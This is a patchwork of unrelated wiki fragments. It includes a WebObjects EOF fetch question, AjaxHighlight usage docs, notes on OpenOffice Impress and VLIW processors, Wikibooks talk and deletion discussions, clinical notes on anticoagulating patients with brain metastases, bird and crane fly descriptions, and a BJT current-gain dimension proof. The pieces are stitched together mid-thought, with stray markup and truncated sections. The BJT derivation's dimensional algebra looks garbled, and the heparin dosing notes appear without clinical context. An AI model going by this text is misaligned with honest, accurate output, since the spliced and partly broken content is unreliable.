''I've run into a rather nasty little problem after making some changes to my app recently. The problem never showed in testing and is difficult to contrive (which is the nasty bit). After an arbitrary and large number of requests, an arbitrary and small proportion of fetches fail. That is to say that some fetches give an object whose properties are all null. For example I wish to fetch a Member with username 'x'. I use a named EOFetchSpecification, specify the qualifier bindings and fetch my EOs.''

EOFetchSpecification fetchSpec = EOFetchSpecification.fetchSpecificationNamed(&quot;usernameFetchSpec&quot;, &quot;Member&quot;);
fetchSpec = fetchSpec.fetchSpecificationWithQualifierBindings(new NSDictionary(&quot;x&quot;, &quot;usernameValue&quot;));
NSArray results = ec.objectsWithFetchSpecification(fetchSpec);

''I most cases I receive the expected results, but in some the first Member object in the NSArray has a null username, password, etc.''

The exception is correct, the snapshot _dbSnapshot = {}; does not contain any values, let alone the one it is looking for.  I am not completely sure of how this happens.  It is not consistent .

I have seen this occur when the field's declared length in the EOModel is less than the actual length of the data in the field.

If you want to know the cause of these, go look in a mirror!  EOF is not broken, you are abusing it and it is fighting back.  Here is what to check:

      <text xml:space="preserve">AjaxHighlight provides a convenient way to queue up an object as highlighted so that it gets a highlight effect when the next page renders.

In the action prior to returning the page that will show a highlight, you can call &lt;tt&gt;AjaxHighlight.highlight(theObject)&lt;/tt&gt;.  The object you highlight could be a String, an EO, or whatever object makes sense in your context.

Then you simply bind &lt;tt&gt;value = ..&lt;/tt&gt; on this component on the following page.  If the value matches an object that was flagged as highlighted, the container you specify will receive the highlight effect.  This component can also generate its own container if you do not specify another container id.

So you can do:
&lt;pre&gt;
private Person _person;
...
public WOActionResults savePerson() {
	_person.editingContext().saveChanges();
	AjaxHighlight.highlight(_person);
	return pageWithName(PersonListPage.class);
}
&lt;/pre&gt;
and in PersonListPage:
&lt;pre&gt;
&lt;ul&gt;
	&lt;wo:WORepetition list = &quot;$people&quot; item = &quot;$repetitionPerson&quot;&gt;
		&lt;wo:AjaxHighlight elementName = &quot;li&quot; value = &quot;$repetitionPerson&quot;&gt;&lt;wo:str value = &quot;$repetitionPerson.name&quot;/&gt;&lt;/wo:AjaxHighlight&gt;
	&lt;/wo:WORepetition&gt;
&lt;/ul&gt;
&lt;/pre&gt;
When the page loads, the newly created person will get the scriptaculous &lt;tt&gt;Effect.Highlight&lt;/tt&gt; yellow flash effect (you can also specify &lt;code&gt;effect = &quot;SomeOtherScriptaculousEffect&quot;&lt;/code&gt; if you don't like &lt;tt&gt;Effect.Highlight&lt;/tt&gt;).

      <text xml:space="preserve">[[Image:OpenOffice.org Impress.png|thumb|OOo Impress]]Impress is a open office tool to create presentations. It's very similar to Microsoft's PowerPoint. Impress can handle both Microsoft's PowerPoint format (ppt) as well as its own open standard format called open document presentation format (odp) which is internationally recognized.

== Working with impress ==
Launch impress and you will be presented with the following screen

[[Image:Impress01.JPG|thumb|Presentation Type]]

This is nothing but the presentation wizard which eases the job of creating presentations. You can either choose Empty Presentation or a template or you can choose to open a existing presentation.

== Choosing a slide design ==

== Adding pictures ==

== Viewing slide show ==

== Saving the document ==
To save the Document, you simply go to '''File''', and press '''Save As'''.  A pop-up window will come up, and from there you can name your spreadsheet and specify its location.  Also, there is a button on the toolbar to save the current spreadsheet.

      <text xml:space="preserve">{{Microprocessor Design}}

'''Very Long Instruction Words''' (VLIW) can be used to simultaneously specify multiple instructions in parallel with one another. 

== VLIW Vs Superscalar ==

In a superscalar design, the microprocessor will have multiple independant execution units. An instruction scheduler determines which instructions will be executed on which execution unit, at what time. This scheduler unit requires large amounts of additional hardware complexity.

VLIW is similar to superscalar architecture except that instead of using scheduling hardware to map instructions to available execution units, instructions for all units are provided in every instruction word. The scheduling is performed by the compiler at compile time. 

The term VLIW comes from the fact that multiple instructions typically requires large instruction words. If each instruction is 32 bits (including opcode, source and destination registers, etc), and the processor has 4 execution cores, then the total instruction word length is 128 bits long!

== Multi-Issue ==

Similar to the VLIW design, a multi-issue processor will issue an unfixed number of instructions per cycle, and each will be executed simultaneously.</text>

In addition to the Lagrangian description of the system, the Hamiltonian description can also be used.

The Hamiltonian &lt;math&gt;\mathcal{H}&lt;/math&gt; can be constructed as follows

&lt;math&gt;\mathcal{H} = \sum_{n} p_{n}\dot{q}_{n} -\mathcal{L} &lt;/math&gt;

Where &lt;math&gt;p&lt;/math&gt; is the momentum, &lt;math&gt;q&lt;/math&gt; is the position, and &lt;math&gt;\mathcal{L}&lt;/math&gt; is the Lagrangian.

      <text xml:space="preserve">== Steps ==

I'm planning on replacing the basic step with a rewritten version. Since noone seems to be maintaining this I can't imagine it being worse.

Firstly I'm going to split it into single bar sections (forward basic, back basic) to make it easier to explain how they link together. I'm also going to start it on the 4, also to make it easier to explain how to link them together (no wordy explanations of when to repeat from in case of a repeated 1 beat.

I'm also going to use wiki tables. But alas I have no time right this instant. Here's what I have: [[User:GalaxiaGuy|GalaxiaGuy]] 18:06, 21 March 2007 (UTC)

Very nice layout Urbane User.  As long as Whiteknight doesn't mind, it'd be OK with me to delete the earlier version.  I think the two of us were the only contributors. -- [[User:Jomegat|Jim Thomas (aka Jomegat)]] 18:14, 21 March 2007 (UTC)
:I'm very glad you like it. I look forward to getting cracking with this wikibook.

If anyone still looks at this, I was thinking of changing the layout to match the one on [[User:Reece/Using_Wikibooks]] made by the person who originally made the pretty layout, but leaving out the policies part, because I can't really think of what more you could say on the policies than what is said on the help pages, unless you're going to go into the history of the policy and linking to important discussions and stuff, but then I think that would be more suited for a book like [[Wikibooks Community]].

I think providing the extra pages with things to do will make it easier for people to see what needs to be done and will give contributors a better sense of direction. I'll just add the links into the table I guess. [[User:Ikarsik|Ikarsik]] ([[User talk:Ikarsik|talk]]) 16:09, 13 April 2008 (UTC)

:I hope you three don't mind, but I went through and simplified this TOC a lot. The older version was nice looking, but it was very difficult to edit or modify. I also flattened out the TOC, since there didn't seem to be any real reason to separate it out into chapters like we were doing. I think we can do a lot of beautification to this page without sacrificing editability like we had. Suggestions always welcome! --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 14:09, 29 November 2008 (UTC)

== Merger from [[Wikibooks Community]] ==

I'm suggesting a merger from [[Wikibooks Community]]. I created that other book as a sort of guide for new users to understanding our environment and processes. However, the more I think about it, the more it should be included here in [[Using Wikibooks]]. The community book is relatively short, and wouldn't add too much bloat to this book. My big hope is to make [[Using Wikibooks]] printable and distributable soon, and the more information we can add to it to help new users, the better. I would love to hear what other people say about this. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 14:12, 29 November 2008 (UTC)
:I'm in favor of that proposal.  I'm also thinking that [[Using Wikibooks]] ought to be more prominently featured on the site - maybe even in the navigtion section in the left panel. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 18:08, 29 November 2008 (UTC)
::I've long wanted to merge all the {{tlx|useful}} and policy pages into this book wholesale, and use the Wikibooks namespace for this book. Instead of separate pages about the Wikibooks project, have a textbook with it's own namespace. That would certainly encourage the idea of having a coherent, organized resource about this wiki. And similarly for the Help namespace. That should be a textbook about using MediaWiki, not random, poorly-organized single pages.
::But that is quite a large decision - I'd want community input on both those proposals before doing anything so radical. &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 18:38, 29 November 2008 (UTC)

::I agree with both Jim and Mike about this. I've said for a long time that our old [[Help:Contents|help pages]] should be redone in book format. [[Using Wikibooks]] is exactly the book that could replace those old pages. That's going to be a ''huge'' project though, so this probably isn't the time or place to discuss it. If people like the merger with [[Wikibooks Community]], I will start working on it later today or tomorrow. It should be relatively straight forward. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 14:46, 30 November 2008 (UTC)

== How to obtain a PDF version of this tutorial ==
Okay, I'm new here, and would like to get a PDF version of this primer for off line reading to get me started, but how do I obtain one?
:See [[Using Wikibooks/Print versions and PDFs]], particularly the section on the Collections Extension. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 12:28, 19 June 2010 (UTC)

== Section Order ==

I'm not sure when it happened, but the section order on the main page has been changed - I think for the worse.  The original intent of the book was to lead the reader through increasing levels of participation in the WB community.  Thus, the Reader section (how to read WB) came before Editor (how to make corrections), then Writer (creating books &amp; organizing a community of editors), and finally Administrator.  Intro and Quickstart can come before that.  Unless there is an objection to this order, I plan to make that change in the next couple of days. Or if someone else agrees that this is a better order, there is no need to wait for me to do it.  --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 00:15, 15 December 2010 (UTC)

: I think the order wasn't changed per say or not intentionally done. I think a minor change in CSS caused it to happen. See [http://en.wikibooks.org/w/index.php?title=Using_Wikibooks&amp;oldid=1857636 before], [http://en.wikibooks.org/w/index.php?title=Using_Wikibooks&amp;oldid=1951700 after] and [http://en.wikibooks.org/w/index.php?title=Using_Wikibooks&amp;diff=1951700&amp;oldid=1857636 diff]. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 00:32, 15 December 2010 (UTC)
::Hmmm. In my browser, both the before and the after have the Reader section coming after Editor &amp; Writer. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 00:46, 15 December 2010 (UTC)
::But it looks like you've fixed it. I guess it  was affected by browser page width. Thanks! --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 00:49, 15 December 2010 (UTC)

Tagged twice for speedy, once by an ip, removed once.  I do not consider it is a book that should be deleted however process should be followed.  Over to you folks --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 18:16, 5 March 2007 (UTC)

*'''Delete''' - I put it for deletion the second time. Reason - the style of the book as it started presents homeopathy as something you could use without any warnings of hazards of these recipes. Moreover statements in this book stub seem to be presented not from critical point of view but from strong supporting point of view. Until now publications on homeopathy this issue do not make major contribution to the pull of top medical journal. Using such kind of treatment cannot be performed safely, but information on homeopathy methods of treatment might be assumed by unexperienced reader as a Cookbook - &quot;so simple, I can do-it-myself&quot;. I have nothing against book on homeopathy, which will have a huge red banner on top of every page, saying something like: &lt;font color=&quot;red&quot;&gt;&lt;b&gt;&quot;this is all just a fairy tale, this is not true method of cure, you can severe harm yourself using this guidelines or receiving treatment from practicing homeopath&quot;&lt;/b&gt;&lt;/font&gt;--[[User:Redsunrising|Redsunrising]] 20:03, 5 March 2007 (UTC)
*'''Delete''' - Warnings or not: is Wikibooks a dumping ground for any old kind of pseudoscience? What's more, is there any respectable university that has a homeopathy class? But even if there were, the fact still remains that there are no respected scientists who support the homeopathic theory of medicine. What I ''would'' support would be a history and debunking (something which tells the story of homeopathy, and why the theory is false)--- but not a &quot;how to&quot;, which is what the book is right now. [[User:PurplePieman|PurplePieman]] 01:24, 6 March 2007 (UTC)
*'''Delete with extreme prejudice''' Utterly unverifiable. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 09:03, 7 March 2007 (UTC)
*'''Move''' - &quot;severe harm&quot; ? Isn't that overreacting a bit ? Perhaps http://protoscience.wikia.com/wiki/Medical_controversies would be a better location for this book. --[[User:DavidCary|DavidCary]] 15:43, 10 March 2007 (UTC)
*'''Keep''': I think homeopathy's a load of fetid dingo's kidneys myself, but why should that allow me to erase somebody's description of the practice? If you have a problem with the content, then edit it: this is a wiki. I've added the 'Danger' notice which is intended for such books. If this were deleted, I'd hope it was because this book is poor/limited quality and not to censor a minority viewpoint. [[User:Ewen|Ewen]] 17:26, 10 March 2007 (UTC)
*'''Keep''': there is at least some content here that deals with the history of the movement, and as a movement it does have some importance. &quot;Alternative medicine&quot; was very much in the news not so long ago in responce to the first wave of the AIDS epidemic. Keeping an eye on these books is a good idea however... the &quot;Danger&quot; notice really only needs to be applied to pages with dangerous treatments (for example, an herbalism book would need to be careful about describing the use of Digitalis, Hellebore, or Aconite, since an overdose of any of them would be lethal). I think it's valid to provide descriptions of such things, so long as it's also made ''very'' clear when a treatment could have dangerous consequences. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 18:03, 10 March 2007 (UTC)
*'''Keep''': I would agree that a strong medical disclaimer ought to be displayed prominently (NPOV in tone too, not &quot;this is pure fantasy and don't do this&quot;) on especially the &quot;main&quot; page of this Wikibook.  Still, this is a verifiable subject that does have legitimate research that has gone into investigating this topic.  Licensed medical doctors (with MD degrees) do get involved with homeopathic remedies.  Now the tone of this particular book is a bit off on the NPOV side of things and it could use some better references to legitimate studies about these treatments.  But that doesn't mean a book about this topic is invalid to have here on Wikibooks.  --[[User:Robert Horning|Rob Horning]] 03:52, 11 March 2007 (UTC)
:If anyone can find a better disclaimer than 'Danger'... I'd say that homeopathy is potentially dangerous if it used in place of life-saving conventional treatments. [[User:Ewen|Ewen]] 10:29, 11 March 2007 (UTC)
::A specific template for the book would probably be better, with a warning on each &quot;remedy&quot; page alerting the reader to the importance of discussing the technique with a physician before &quot;trying it at home&quot;. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 13:26, 11 March 2007 (UTC)
:::Fair enough! [[User:Ewen|Ewen]] 16:06, 11 March 2007 (UTC)
*'''Keep''' - This is a popular and interesting topic which may encourage visitors to Wikibooks and more contributers.  It's detailed and informative too.  A disclaimer is probably needed just like we added one for the Cookbook page for magic brownies.

      <text xml:space="preserve">'''Religious fundamentalism''' first appeared in the late 19th century in the USA. At that time, some of the more liberal protestants attempted to adapt their views to the modern world, while other, more conservative protestants, opposed this. They stood behind the belief that the Bible must be understood literally. They created a set of pamphlets named ''[[w:The Fundamentals|The Fundamentals]]''.

We place all conservative doctrines, movements and groups which oppose the modern society, a modern way of life and science under fundamentalism. They differ from each other by the reason of their creation, their goals and the ways with which to achieve them (violence, conversation, bribery).

All of the above share some common points:
* religious texts are perfect, without mistakes or misinterpretations - they must be read literally
* they deny [[w:Religious pluralism|religious pluralism]]
* modern society is fraught with negative influences (a society of consumers, hedonism and moral plurality)
* they have firm beliefs in connection with their religion
* opposition to feminism, homosexuals, abortion and birth regulation movements
* their religion should become the foundation for the life of the society and each individual
* all who disagree with their beliefs are considered enemies

==Brain Metastases==
*Brain hemorrhage risk higher with brain mets and anticoagulation
*Treatment is thus a judgment call between risk of brain hemorrhage vs. risk of death/complications from thromboembolism  
*MSKCC data suggests &lt;10% risk of significant CNS complications on anticoagulation. Caution with hemorrhagic histologies
*It is important not to reach supratherapeutic levels; LMWH is probably safer from that perspective
*Gamma Knife treatment is not considered a contraindication


*'''MSKCC, 1994''' PMID 8293418 -- &quot;Therapy of venous thromboembolism in patients with brain metastases.&quot; (Schiff D, Cancer. 1994 Jan 15;73(2):493-8.)
**Retrospective. 51 patients, 10 treated with IVC, 39 treated with anticoagulation, 2 not treated (both died of PE)
**IVCF: 4/10 recurrent nonfatal thromboembolic events (2 PEs, 2 DVTs) -&gt; 3/4 required secondary anticoagulation
**Anticoagulation: 39 as primary therapy + 3 secondary after IVCF failure. 2/42 patients devastating CNS hemorrhage in the setting of supratherapeutic anticoagulation, 1/42 minor deterioration (overall 7% incidence of CNS complications on anticoagulation). 3/42 asymptomatic with hyperdensity on CT
**Conclusion: Anticoagulation more effective than IVC. Acceptably safe when maintained within therapeutic range


'''Review'''
*'''Hopkins, 2006''' PMID 16525187 -- &quot;Management of venous thromboembolism in patients with primary and metastatic brain tumors.&quot; (Gerber DE, J Clin Oncol. 2006 Mar 10;24(8):1310-8.)
**Anticoagulation can be used safely and effectively for most patients; IC hemorrhage often due to overanticoagulation
**High risk patients: thrombocytopenia, recent neurosurgery, tumor types prone to bleeding (renal cell, melanoma, choriocarcinoma, thyroid cancer) are relative contraindication
**Mechanical approaches have high complication rate and high failure rates, but can be used if cannot anti-coagulate
**Antithrombolytic agents are absolute contraindication
**Treatment recommendation:
***High risk (craniotomy within 3-5 days, high risk histology, recent bleeding): IVCF
***Acute/progressive symptoms: mini-heparin bolus (40 U/kg IV) or full heparin bolus (80 U/kg IV) for 24 hours depending on severity of TE symptoms. Careful monitoring of therapeutic level. Then long-term LMWH or warfarin
***Standard risk (eg DVT): IV heparin (no bolus) for 24 hours, then long-term LMWH or warfarin 

*'''Paris, 2005''' (France) PMID 16224238 -- &quot;Palliative care in patients with brain metastases.&quot; (Taillibert S, Curr Opin Oncol. 2005 Nov;17(6):588-92.)
**Prophylaxis: recommended if decreased mobility, with LMWH
**Symptomatic DVH: anticoagulation safe; recommend LMWH due to lack of interaction with chemo and convenience
**Hemorrhagic mets: unless active bleeding, can anticoagulate, but requires strict monitoring
**Avoid NSAIDs and Vitamin K</text>

| description =The '''Red-winged Blackbird''', '''''Agelaius phoeniceus''''', is a passerine bird found in most of North and much of Central America. It breeds from Alaska and Newfoundland south to Florida, the Gulf of Mexico, Mexico and Guatemala, with isolated populations in western El Salvador, northwestern Honduras and northwestern Costa Rica. It may winter as far north as Pennsylvania and British Columbia, but northern populations are generally bird migration, moving south to Mexico and the southern United States.

The common name for this species is taken from the mainly black adult male's distinctive red shoulder patches, or &quot;epaulets&quot;, which are visible when the bird is flying or displaying. At rest, the male also shows  a pale yellow wingbar. The female is blackish-brown and paler below. The female is considerably smaller than the male, at 17-18 cm (7 inches) length and 36 g weight, against his 22-24 cm (9.5 inches) and 64 g. Young birds resemble the female, but are paler below and have buff feather fringes. Both sexes have a sharply pointed bill.

The Red-winged Blackbird feeds primarily on plant seeds, including weeds and waste grain, but about a quarter of its diet consists of insects, spiders, mollusks and other small animals, considerably more so during breeding season (Srygley &amp; Kingsolver 1998). In season, it eats blueberries, blackberries, and other fruit. These birds can be lured to backyard bird feeders by bread and seed mixtures.

When migrating north, these birds travel in single-sex flocks, and the males usually arrive a few days before the females. Once they have reached the location where they plan to breed, the males stake out territories by singing. They defend their territory aggressively, both against other male Red-winged Blackbirds and against birds they perceive as threatening, including crows, Ospreys, hawks, and even humans.

The call of this species is a throaty ''check'', and the male's song is scratchy ''oak-a-lee'' (see below).

Red-winged Blackbirds prefer marshes, but will nest near any body of water. Pairs raise two or three clutches per season, in a new nest for each clutch. The nests are cups of vegetation, and are either built in shrubs or attached to marsh grass. A clutch comprises three to five eggs. These are incubated by the female and hatch in 11-12 days. Red-winged Blackbirds are hatched blind and naked, but are ready to leave the nest ten days after hatching.

Red-winged Blackbirds are polygynous, with territorial males defending up to 10 females. However, females frequently copulate with males other than their social mate and often lay clutches of mixed paternity.

When the breeding season is over, Red-winged Blackbirds gather in huge flocks, sometimes numbering in the millions. In some parts of the United States, they are considered to be pests because these flocks can consume large amounts of cultivated grain or rice. This bird's numbers are declining due to habitat loss and the use of poison to prevent this loss of crops.

Despite the similar names, the Red-winged Blackbird is not related to the European Redwing or the Old World Blackbirdthrushes (''Turdidae'').

| description = The '''American Crow'''is a common bird found throughout North America. Entirely black, it is an easily recognized bird.

The American Crow is a distinctive bird with iridescent black feathers. Its legs, feet and bill are also black. Several regional forms are recognized and differ in bill proportion and overall size from each other across North America, generally being smallest in the southeast and the far west. Averaging 18 inches (46 cm) in length, it is smaller than the Common Raven. American Crows have a lifespan of 7 to 8 years. Captive birds are known to have lived up to 30 years.

The most usual call is a loud, short, and rapid ''&quot;caah-caah-caah&quot;''.  Usually, the birds thrust their heads up and down as they utter this call.  American Crows can also produce a wide variety of sounds and sometimes mimic noises made by other animals, including other birds.

Crows live in virtually all types of country from wilderness, farmland, parks, open woodland to towns and major cities. The crow is generally a permanent resident, but many birds in the northern parts of the range migrate short distances southward. Outside of the nesting season, these birds often gather in large communal roosts at night. American Crows are protected by the [[w:Migratory Bird Treaty Act of 1918|Migratory Bird Treaty Act of 1918]].
{{clear}}

The American Crow is omnivorous. It will feed on invertebrates of all types, carrion, scraps of human food, seeds, eggs and nestlings, stranded fish on the shore and various grains. American Crows are active hunters and will prey on mice, frogs, and other small animals. In winter and autumn, the diet of American Crows is more dependent on nuts and acorns. Occasionally, they will visit bird feeders.

Like most crows, they will scavenge at rubbish dumps, scattering garbage in the process. Where available, corn, wheat and other agricultural crops are a favorite food. These habits have historically caused the American Crow to be considered a nuisance. However, it is suspected that the harm to crops is offset by the service the American Crow provides by eating insect pests.

American Crows are monogamous cooperative breeding birds. Mated pairs form large families of up to 15 individuals from several breeding seasons that remain together for many years. Offspring from a previous nesting season will usually remain with the family to assist in rearing new nestlings. American Crows do not reach breeding age for at least two years. Most do not leave the nest to breed for four to five years.

American Crows build bulky stick nests, nearly always in trees but sometimes also in large bushes and, very rarely, on the ground. They will nest in a wide variety of trees, including large conifers, although oaks are most often used. Three to six eggs are laid and incubated for 18 days. The young are fledged usually by about 35 days.

Despite attempts by humans in some areas to drive away or eliminate these birds, they remain widespread and very common. The number of individual American Crows is estimated by Birdlife International to be around 31,000,000. The large population, as well as its vast range, are the reasons why the American Crow is considered to be of least concern, meaning that the species is not at immediate risk.

This page will show that ''&amp;beta;'', the common-emitter current gain of a BJT has no units.

''&amp;beta;'' is given by:

::&lt;math&gt;
\beta  = 1/\left( {\frac{{D_p N_A W}}
{{D_n N_D L_p }} + \frac{1}
{2}\frac{{W^2 }}
{{D_n \tau _b }}} \right)&lt;/math&gt;

where
*''D&lt;sub&gt;p&lt;/sub&gt;'' and ''D&lt;sub&gt;n&lt;/sub&gt;'' are the hole and electron diffusivity, in cm&lt;sup&gt;2&lt;/sup&gt; s&lt;sup&gt;-1&lt;/sup&gt;
*''N&lt;sub&gt;D&lt;/sub&gt;'' and ''N&lt;sub&gt;A&lt;/sub&gt;'' are the donor and acceptor doping concentrations, in cm&lt;sup&gt;-3&lt;/sup&gt;
*''W'' is the base width, in cm
*''L&lt;sub&gt;p&lt;/sub&gt;'' is the hole diffusion length in the emitter, in cm
*''&amp;tau;&lt;sub&gt;b&lt;/sub&gt;'' is the minority carrier lifetime in the base, in s

So we have:

::&lt;math&gt;\left[ \beta  \right] = \left( {\frac{{L^2 T^{ - 1} L^{ - 3} L}}
{{L^2 T^{ - 1} L^{ - 3} L}} + \frac{{L^2 W^2 }}
{{L^2 T^{ - 1} T}}} \right)^{ - 1}&lt;/math&gt;

Notice that the first term in the addition is a ratio of two quantities with identical dimensions. This leaves us with:

::&lt;math&gt;\left[ \beta  \right] = \left( {\frac{{L^2 }}
{{L^2 T^{ - 1} T}}} \right)^{ - 1}  = \left( {\frac{{L^2 }}
{{L^2 }}} \right)^{ - 1}&lt;/math&gt;

We now have the reciprocal of a ratio of identically dimensioned quantities. Therefore, ''&amp;beta;'' is dimensionless.</text>

| description = The {{units|32 cm|12.5 inch}} long adults have a long dark bill, a pale yellowish eye and a long tail; their plumage is an iridescent black. Adult females are slightly smaller and less glossy.

Their breeding habitat is open and semi-open areas across North America east of the Rocky Mountains. The nest is a well-concealed cup in dense trees (particularly pine) or shrubs, usually near water; sometimes, they will nest in cavities or in man-made structures. They often nest in colonies, some being quite large.

This bird is a permanent resident in much of its range. Northern birds migrate in flocks to the southeastern United States.

These birds forage on the ground, in shallow water or in shrubs; they will steal food from other birds. They are omnivorous, eating insects, minnows, frogs, eggs, berries, seeds and grain, even small birds.

This bird's song is particularly harsh, especially when these birds, in a flock, are calling.

The range of this bird expanded west as forests were cleared. In some areas, they are now considered a pest by farmers because of their large numbers and fondness for grain.

      <text xml:space="preserve">==What does it look like?==
[[Image:Crane_fly.jpg|thumb|right|300px|Crane fly perched on a limb.]]

The adult crane fly is large and fragile with long slender legs. Its body length varies from 1/8 inch to 3 inches. It looks a little like a huge mosquito. Its long legs make it a relatively poor flier compared to other flies. Just behind and at the base of the wings is a pair of balancing organs, called halteres.

Because of its unusual appearance, there are many different names for the crane fly. Among the names are gallinipper, gollywhopper, jimmy spinner and mosquito hawk. Its common name in the United Kingdom, and Ireland is daddy long-legs.

Scientists consider the crane fly to be a “true fly” because it has only one pair of wings. 

The female abdomen ends in an ovipositor for laying eggs. The ovipositor is pointed and looks like a stinger but is completely harmless.

==Where does it live?==

Crane flies are found all around the world in temperate or tropical climates. At least 14,000 species of crane flies have been described worldwide. They can be found in lawns and turf, and in moist soil around ponds and streams. Compost piles provide an attractive home for crane flies. They rest on the soil surface just below the decaying vegetation.

This species has a broad range of habitats. It lives in cold arctic tundra and sub-arctic spruce forests. It likes white pine, jack pine and other evergreens in the northern Great Lakes region. East of the Mississippi River and southward along the Appalachian Mountains, it lives in forests of beech, maple, hemlock, and birch. 

The crane fly usually likes moist environments such as woodlands, streams and flood plains. But some species inhabit open fields, dry rangeland, and even deserts.

==What does it eat?==

The crane fly is sometimes called &quot;mosquito hawk&quot; or &quot;mosquito lion.&quot; Despite this ferocious name, it does not actually eat mosquitoes. Occasionally, its larvae will feed on mosquito larvae. Crane fly larvae mostly feed on roots of forage crops, turf grasses and seedling field crops. 

An adult crane fly hardly eats at all. Once in a while, it might lap up a bit of pollen or sugar-rich plant nectar.

==How does it defend itself?==
The adult crane fly has little in the way of defense. It falls prey to birds, bats, cats and yellow jackets. Unlike most flies, it is a weak, poor flier with a tendency to &quot;wobble&quot; in unpredictable patterns during flight. It can be caught without much effort. 

The way its delicate legs break off, even without direct contact, may help it evade predators. 

In its larval form, the crane fly is defenseless. The larvae are often eaten by birds, such as robins and starlings. In addition to birds, there are many natural enemies beneath the soil. Tiny parasites, beetles, frogs, and small mammals attack the larvae in the wintertime.

==What stages of metamorphosis does it go through?==
[[Image:Tipula_leatherjacket_Emelt.jpg|thumb|left|200px|]] The crane fly goes through a complete metamorphosis. The adult emerges from late August to mid-September, mates and lays eggs. The female lays most of her eggs before making her first flight. 

The eggs hatch quickly in the soil. As they develop, the gray-brown, worm-like larvae begin feeding on roots in moist soil. The feeding is slow in the winter, speeds up in early spring, and ends in mid-May. The larvae change to quiet pupa in July and August. The leathery, shiny pupal case is called a “leatherjacket.” The adult crane fly comes out of the ground in August and September, living just long enough to mate and lay eggs.

==What special behavior does it exhibit?==
Crane fly larvae are called “leatherjacket slugs&quot; because of their movement and the way they sometimes damage plants.

The adult snow crane fly is unusual because it emerges from snow in very cold temperatures. It is frequently seen crawling sluggishly on the surface after a fresh fall of snow. Some scientists believe it lives in nests of small mammals, such as mice and chipmunks. Its natural history is still largely a mystery.

==How does this bug affect people?==
The crane fly is an insect that appears to be a giant mosquito, but it does not bite. It is not generally considered a pest. In certain circumstances, the crane fly can be a problem in lawns and landscape plants, but not often.

Some crane fly larva feed on roots in nurseries that sell turf and seedlings. Cereal and grain crops are sometimes damaged by crane fly larvae. Most of the time, healthy lawns and plants can tolerate their presence as long as natural enemies keep populations down.

The crane fly is an important food source for birds, fish, and other animals. As an aquatic insect it can be an indicator of good water quality. Its larvae are important decomposers that break down waste in streams and soil. This activity creates rich organic material used by other organisms. Crane fly larvae attract fish looking for food. Fishermen even design their lures to mimic crane fly larva.

| description =The '''Gray Catbird''' is a medium-sized perching bird.

Adults are dark gray with a slim, black bill and dark eyes. They have a long dark tail, dark legs and a dark cap; they are rust-colored underneath their tail.

Their breeding habitat is semi-open areas with dense, low growth across most of North America. They are found in urban, suburban, and rural habitats. They build a bulky cup nest in a shrub or tree, close to the ground. Eggs are light blue in color, and clutch size ranges from 1-5, with 2-3 eggs most common. Both parents take turns feeding the young birds.

They migrate to the southeastern United States, Mexico and Central America. 

These birds forage on the ground in leaf litter, and love freshly worked earth.  Some may even visit a freshly turned garden while the gardener is still present. They mainly eat insects and berries.

In the United States, this species receives special legal protections under the [[w:Migratory Bird Treaty Act of 1918|Migratory Bird Treaty Act of 1918]].

The catbird is named for its cat-like call, but it also mimics the songs of other  birds.  A catbird's song is easily distinguished from that of the Northern Mockingbird or Brown Thrasher because the mockingbird repeats phrases 3-4 times, and the brown thrasher usually repeats each phrase twice, whereas the catbird sings each phrase only once.  The catbird's song is usually described as more raspy and less musical than a mockingbird.

The catbird produces a variety of calls, including the familiar ones resembling a cat's meow, as well as an alarm call which resembles the quiet quacking of a male mallard.

In contrast to many songbirds which choose a prominent perch from which to sing, the catbird often chooses to sing from inside a bush or small tree, where they are obscured from view by the foliage.

The syrinx of gray catbirds has an unusual structure that not only allows them to make mewing sounds like that of a cat but also allows them to imitate other birds, tree frogs, and even mechanical sounds that they hear. Their unusual syrinx also allows them to sing in two voices at once.

Gray catbirds are not afraid of predators and respond to them aggressively to them by flashing their wings and tails and by making their signature mew sounds. They are also known to even attack and peck predators that come too near their nests.

| description = Adults have a short finch-like bill and dark eyes. The adult male is mainly iridescent black with a brown head. The adult female is grey with a pale throat and fine streaking on the underparts.

Breeding in open or semi-open country across most of North America, this bird is a brood parasite: it lays its eggs in the nests of other small perching birds, particularly those that build cup-like nests, such as the Yellow Warbler. The young cowbird is fed by the host parents at the expense of their own young.

